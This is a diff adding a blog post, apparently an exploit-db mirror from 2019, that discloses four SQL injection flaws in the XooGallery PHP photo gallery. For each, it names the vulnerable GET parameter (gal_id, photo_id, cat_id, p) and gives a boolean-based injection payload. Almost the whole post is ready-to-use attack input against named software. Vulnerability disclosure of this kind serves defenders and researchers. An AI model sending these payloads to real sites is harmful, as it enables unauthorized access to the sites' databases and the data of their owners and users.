@@ -1,0 +1,42 @@
+---
+layout:     post
+title:      "XooGallery - Multiple SQL Injections"
+date:       2019-03-26 12:01
+author:     "Ahmet Ümit BAYRAM"
+category:   exploit
+tags:       [sql, sqli, sql injection, exploit-db]
+---
+
+# Exploit Title: XooGallery - Multiple SQL Injections
+# Date: 26.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://xooscripts.com/product/html5-php-photo-gallery.html
+# Demo Site: http://xooscripts.com/demos/xoogallery/
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/gal.php?gal_id=1
+Vulnerable Parameter: gal_id (GET)
+Payload: gal_id=29' AND 2692=2692 AND 'WCFf'='WCFf
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/photo.php?photo_id=1
+Vulnerable Parameter: photo_id (GET)
+Payload: photo_id=1' AND 5479=5479#
+
+----- PoC 3: SQLi -----
+
+Request: http://localhost/[PATH]/cat.php?cat_id=1
+Vulnerable Parameter: cat_id (GET)
+Payload: cat_id=1' AND 9338=9338 AND 'SZIH'='SZIH
+
+
+----- PoC 4: SQLi -----
+
+Request: http://localhost/[PATH]/results.php?p=1
+Vulnerable Parameter: p (GET)
+Payload: p=-8412' OR 2597=2597#
